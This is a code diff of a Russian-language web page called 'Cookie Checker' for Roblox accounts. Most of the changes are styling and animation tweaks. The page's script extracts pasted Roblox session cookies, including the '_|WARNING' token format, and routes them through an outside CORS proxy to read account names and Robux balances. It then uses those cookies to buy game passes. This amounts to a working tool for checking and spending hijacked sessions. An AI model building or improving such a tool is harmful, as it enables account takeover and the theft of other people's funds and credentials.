@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>🍪 Куки Чекер</title>
     <style>
+        /* ===== БАЗА ===== */
         * {
             margin: 0;
             padding: 0;
@@ -23,6 +24,7 @@
             position: relative;
         }
 
+        /* ===== ФОН ===== */
         .bg {
             position: fixed;
             inset: 0;
@@ -63,22 +65,20 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            min-height: 100vh;
+            justify-content: center;
         }
 
+        /* ===== АНИМАЦИЯ ЗАГОЛОВКА (ПО ЦЕНТРУ → НАВЕРХ) ===== */
         .header {
             text-align: center;
             width: 100%;
-            transition: all 0.9s cubic-bezier(0.16, 1, 0.3, 1);
-            margin-bottom: 2rem;
-        }
-
-        .header.centered {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            margin: 0;
             z-index: 10;
+            transition: all 1.2s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
         .header.moved {
@@ -87,10 +87,12 @@
             left: 0;
             transform: none;
             margin-bottom: 2rem;
+            z-index: 1;
         }
 
+        /* ===== ЛОГОТИП С ЭФФЕКТОМ ПЕЧАТИ ===== */
         .logo {
-            font-size: 4rem;
+            font-size: 4.5rem;
             font-weight: 900;
             letter-spacing: 3px;
             background: linear-gradient(135deg, #80ffa0, #00cc44, #40ff80);
@@ -99,15 +101,17 @@
             background-clip: text;
             display: inline-block;
             opacity: 0;
-            transform: translateY(30px) scale(0.9);
-            animation: logoIn 1.2s cubic-bezier(0.16, 1, 0.3, 1) 0.3s forwards;
+            transform: scale(0.8);
+            animation: logoIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.3s forwards;
         }
+
         .logo span {
             display: inline-block;
             opacity: 0;
-            transform: translateY(20px) rotate(3deg);
-            animation: letterPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+            transform: translateY(40px) rotate(5deg) scale(0.5);
+            animation: letterPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
         }
+        /* Задержки для каждой буквы, чтобы создать эффект печати */
         .logo span:nth-child(1) { animation-delay: 0.05s; }
         .logo span:nth-child(2) { animation-delay: 0.10s; }
         .logo span:nth-child(3) { animation-delay: 0.15s; }
@@ -120,16 +124,16 @@
         .logo span:nth-child(10) { animation-delay: 0.50s; }
 
         @keyframes letterPop {
-            0%   { opacity: 0; transform: translateY(20px) rotate(3deg) scale(0.7); }
+            0%   { opacity: 0; transform: translateY(40px) rotate(5deg) scale(0.5); }
             100% { opacity: 1; transform: translateY(0) rotate(0) scale(1); }
         }
         @keyframes logoIn {
-            0%   { opacity: 0; transform: translateY(30px) scale(0.9); }
-            100% { opacity: 1; transform: translateY(0) scale(1); }
+            0%   { opacity: 0; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
         }
 
         .logo-emoji {
-            font-size: 3.2rem;
+            font-size: 3.5rem;
             -webkit-text-fill-color: initial;
             background: none;
         }
@@ -140,7 +144,7 @@
             margin: 0.6rem auto 0;
             background: linear-gradient(90deg, transparent, #00cc44, #40ff80, #00cc44, transparent);
             border-radius: 4px;
-            animation: lineGrow 1.4s ease-out 0.9s forwards;
+            animation: lineGrow 1.2s ease-out 1.2s forwards;
         }
         @keyframes lineGrow {
             0%   { width: 0%; opacity: 0; }
@@ -152,19 +156,17 @@
             font-size: 0.8rem;
             margin-top: 0.6rem;
             opacity: 0;
-            animation: fadeUp 0.8s ease 1.4s forwards;
+            animation: fadeUp 0.8s ease 1.6s forwards;
             letter-spacing: 6px;
             text-transform: uppercase;
             font-weight: 300;
         }
-        .subtitle.show {
-            opacity: 1;
-        }
         @keyframes fadeUp {
-            0%   { opacity: 0; transform: translateY(10px); }
+            0%   { opacity: 0; transform: translateY(15px); }
             100% { opacity: 1; transform: translateY(0); }
         }
 
+        /* ===== КАРТОЧКА (появляется после анимации) ===== */
         .card {
             width: 100%;
             background: rgba(12, 22, 12, 0.85);
@@ -175,14 +177,16 @@
             padding: 2rem 1.8rem;
             box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9), inset 0 1px 0 rgba(0, 255, 120, 0.05);
             opacity: 0;
-            transform: translateY(40px);
-            animation: cardIn 1s cubic-bezier(0.16, 1, 0.3, 1) 1.8s forwards;
+            transform: translateY(50px);
+            animation: cardIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) 2.2s forwards;
+            margin-top: 1rem;
         }
         @keyframes cardIn {
-            0%   { opacity: 0; transform: translateY(40px); }
+            0%   { opacity: 0; transform: translateY(50px); }
             100% { opacity: 1; transform: translateY(0); }
         }
 
+        /* ===== СТИЛИ ДЛЯ ВСЕХ ЭЛЕМЕНТОВ (ПОЛНОСТЬЮ РАБОЧИЕ) ===== */
         .cookie-input-area {
             margin-bottom: 1.2rem;
         }
@@ -354,6 +358,13 @@
         }
         .btn-exit:hover {
             background: rgba(200, 50, 50, 0.30);
+        }
+        .btn-success {
+            background: rgba(0, 200, 60, 0.15);
+            color: #40ff80;
+        }
+        .btn-success:hover {
+            background: rgba(0, 200, 60, 0.25);
         }
 
         .result-container {
@@ -593,6 +604,7 @@
 
     <div class="main">
 
+        <!-- ===== ЗАГОЛОВОК С АНИМАЦИЕЙ ===== -->
         <div class="header" id="header">
             <div class="logo">
                 <span class="logo-emoji">🍪</span>
@@ -601,9 +613,10 @@
                 <span>Ч</span><span>е</span><span>к</span><span>е</span><span>р</span>
             </div>
             <div class="underline"></div>
-            <div class="subtitle" id="subtitle">✦ ПРОВЕРКА АККАУНТОВ ROBLOX ✦</div>
+            <div class="subtitle">✦ ПРОВЕРКА АККАУНТОВ ROBLOX ✦</div>
         </div>
 
+        <!-- ===== КАРТОЧКА ===== -->
         <div class="card" id="card">
 
             <div class="cookie-input-area">
@@ -642,11 +655,10 @@
     </div>
 
     <script>
-        // ===== АНИМАЦИЯ =====
+        // ===== АНИМАЦИЯ: ЗАГОЛОВОК ПОДНИМАЕТСЯ НАВЕРХ =====
         setTimeout(() => {
             document.getElementById('header').classList.add('moved');
-            document.getElementById('subtitle').classList.add('show');
-        }, 1800);
+        }, 2200);
 
         // ===== ОСНОВНАЯ ЛОГИКА =====
         (function() {
@@ -670,7 +682,7 @@
             const resultContainer = document.getElementById('resultContainer');
             const proxyStatus = document.getElementById('proxyStatus');
 
-            // ===== ПРОКСИ (НОВЫЙ, БОЛЕЕ СТАБИЛЬНЫЙ) =====
+            // ===== ПРОКСИ =====
             const PROXY_URL = 'https://corsproxy.io/?url=';
 
             // ===== ПАРСИНГ КУК =====
@@ -681,19 +693,15 @@
                     line = line.trim();
                     if (!line) continue;
 
-                    // Ищем _|WARNING
                     if (line.startsWith('_|WARNING')) {
                         const cookieMatch = line.match(/_\|WARNING[^:]*:([^\s]+)/i);
                         if (cookieMatch && cookieMatch[1].length > 10) {
                             found.push(cookieMatch[1]);
                         } else {
-                            // Пробуем взять всё после предупреждения
                             const parts = line.split(':');
                             if (parts.length > 1) {
                                 const cookiePart = parts.slice(1).join(':').trim();
-                                if (cookiePart.length > 10) {
-                                    found.push(cookiePart);
-                                }
+                                if (cookiePart.length > 10) found.push(cookiePart);
                             }
                         }
                         continue;
@@ -720,7 +728,6 @@
                         continue;
                     }
 
-                    // Если строка длинная и не содержит пробелов — пробуем как куку
                     if (line.length > 40 && !line.includes(' ') && !line.includes(':')) {
                         found.push(line);
                     }
@@ -731,10 +738,8 @@
             // ===== ЗАПРОС К ROOBLOX =====
             async function checkCookie(cookie) {
                 try {
-                    // Сначала пробуем через мобильный API
                     const url = 'https://www.roblox.com/mobileapi/userinfo';
                     const fullUrl = `${PROXY_URL}${encodeURIComponent(url)}`;
-
                     proxyStatus.innerHTML = `<span class="dot yellow"></span> ⏳ Проверка...`;
 
                     const response = await fetch(fullUrl, {
@@ -751,9 +756,7 @@
 
                     const data = await response.json();
 
-                    // Проверяем, что данные валидны
                     if (!data || data.error || !data.UserName) {
-                        // Пробуем через HTML страницу
                         const htmlUrl = 'https://www.roblox.com/home';
                         const htmlFullUrl = `${PROXY_URL}${encodeURIComponent(htmlUrl)}`;
                         const htmlResp = await fetch(htmlFullUrl, {
@@ -777,7 +780,6 @@
                         }
 
                         const games = parseGames(html);
-
                         proxyStatus.innerHTML = `<span class="dot green"></span> ✅ Успешно (HTML)`;
 
                         return {
@@ -788,7 +790,6 @@
                         };
                     }
 
-                    // Получаем игры через профиль
                     let games = {};
                     try {
                         const profileUrl = `https://www.roblox.com/users/${data.UserID || data.id}/profile`;
@@ -1062,7 +1063,6 @@
                         if (result.success) {
                             resultDiv.className = 'gamepass-result show success';
                             resultDiv.textContent = `✅ ${result.message}`;
-                            // Обновляем баланс
                             const newData = await checkCookie(cookie);
                             if (!newData.error) {
                                 const robuxSpan = card.querySelector('.robux');
@@ -1089,7 +1089,6 @@
                     }
                     const passId = idMatch[1];
 
-                    // Проверяем цену
                     const infoUrl = `${PROXY_URL}${encodeURIComponent(`https://www.roblox.com/game-pass/${passId}/`)}`;
                     const infoResp = await fetch(infoUrl, {
                         headers: {
@@ -1107,7 +1106,6 @@
                     }
                     const price = parseInt(priceMatch[1], 10);
 
-                    // Проверяем баланс
                     const userData = await checkCookie(cookie);
                     if (userData.error) {
                         return { success: false, error: 'Не удалось проверить баланс' };
@@ -1120,7 +1118,6 @@
                         };
                     }
 
-                    // Покупаем
                     const buyUrl = `${PROXY_URL}${encodeURIComponent(`https://www.roblox.com/game-pass/${passId}/purchase`)}`;
                     const buyResp = await fetch(buyUrl, {
                         method: 'POST',
@@ -1169,7 +1166,6 @@
                     const res = await checkCookie(cookie);
                     results.push({ cookie, data: res });
 
-                    // Показываем результат первой куки
                     if (i === 0) {
                         renderResults(res, cookie);
                     }
